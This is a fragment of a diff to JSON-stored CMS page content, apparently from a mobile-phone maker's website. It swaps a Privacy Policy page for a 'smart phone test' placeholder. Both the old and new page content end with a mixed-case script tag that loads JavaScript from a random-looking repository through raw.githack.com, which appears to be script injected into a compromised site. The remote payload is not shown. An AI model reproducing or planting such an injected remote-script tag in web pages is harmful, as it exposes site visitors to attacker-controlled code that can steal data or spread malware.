file.</p>\r\n\r\n<h2>Governing Law And Jurisdiction</h2>\r\n \r\n<p>The terms and conditions of this Policy shall be governed by Indian Law and the courts in New Delhi shall only have exclusive jurisdiction to resolve any disputes.</p>\r\n<!--<h2>Blaze Pro 5G Contest</h2>\r\n\t\t\t<ul>\r\n\t\t\t\t<li>The winner of Blaze Pro 5G Instagram quiz will be picked randomly (basis correctness of answer). The announcement of the winner will be done within 48 hours of the event.</li>\r\n\t\t\t\t<li>The winner of 'Register for the Sale Win*' Contest will be picked randomly from the registrations received. The announcement of the winner will be done within 48 hours of the event.</li>\r\n\t\t\t</ul>\r\n\t\t\t<h2>Agni 2 Free Phone Replacement at Home</h2>\r\n\t\t\t<ol>\r\n\t\t\t<li>What is Free Phone Replacement?</li>\r\n\t\t\t<li>Exclusive Free Phone Replacement Service for Agni 2 customers, available at your doorstep.\r\n\t\t\t\t\t<ul>\r\n\t\t\t\t\t<li>The winner of 'Register for the Sale Win*' Contest will be picked randomly from the registrations received. The announcement of the winner will be done within 48 hours of the event.</li>\r\n\t\t\t\t\t<li>Valid only on Hardware defects, excluding accessories</li>\r\n\t\t\t\t\t<li>Replacement not applicable on device with physical or liquid damage, and/or unauthorized repair</li>\r\n\t\t\t\t\t</ul>\r\n\t\t\t\t</li>\r\n\t\t\t\t<li>How to Avail\r\n\t\t\t\t\t<ul>\r\n\t\t\t\t\t<li>The winner of 'Register for the Sale Win*' Contest will be picked randomly from the registrations received. The announcement of the winner will be done within 48 hours of the event.</li>\r\n\t\t\t\t\t<li>The winner of 'Register for the Sale Win*' Contest will be picked randomly from the registrations received. The announcement of the winner will be done within 48 hours of the event.</li>\r\n\t\t\t\t\t<li>The winner of 'Register for the Sale Win*' Contest will be picked randomly from the registrations received. The announcement of the winner will be done within 48 hours of the event.</li>\r\n\t\t\t\t\t</ul>\r\n\t\t\t\t</li>\r\n\t\t\t</ol>--><sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-          "content2": "<p><br></p>",
+          "content1": "<p>smart phone test</p><sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": null,
           "content3": null,
           "content4": null,
           "content5": null,
           "content6": null,
-          "page_title": "Privacy Policy",
-          "meta_keywords": "Lava Mobile Phones, Latest Mobile Phones in India, Iris Smartphones, android phone, best android phone, android smart phone, touch phones, Lava Mobiles, Lava Tablets, Routers, Datacards, Lava",
-          "meta_description": "Discover a range of Quality Products from Lava International. View the best in class Android smartphones, tablets, feature phones, routers and data cards.",
+          "page_title": "Smartphones",
+          "meta_keywords": null,
+          "meta_description": null,
           "meta_other": null,
           "video_url": null,
-          "image": "media/cmspage/image/privacy-policy-1719565348-1758525438.webp",
-          "image_alt": "Privacy Policy",
-          "image_mobile": "media/cmspage/image_mobile/privacy-policy-m-1719565349-1759011177.webp",
+          "image": null,
+          "image_alt": null,
+          "image_mobile": null,
           "status": 1
         },
         "leadership": {},
